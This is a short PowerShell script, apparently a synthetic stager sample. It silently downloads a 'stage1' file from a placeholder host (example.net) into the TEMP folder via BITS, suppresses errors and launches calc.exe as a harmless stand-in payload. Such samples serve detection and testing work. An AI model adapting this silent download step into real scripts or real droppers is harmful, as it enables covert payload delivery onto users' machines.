[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://example.net/stage1.ps1",
    [string]$WorkingPath = "$env:TEMP\stage1.bin",
    [int]$ConnectionTimeout = 174
)
Start-BitsTransfer -Source $DownloadUrl -Destination $WorkingPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
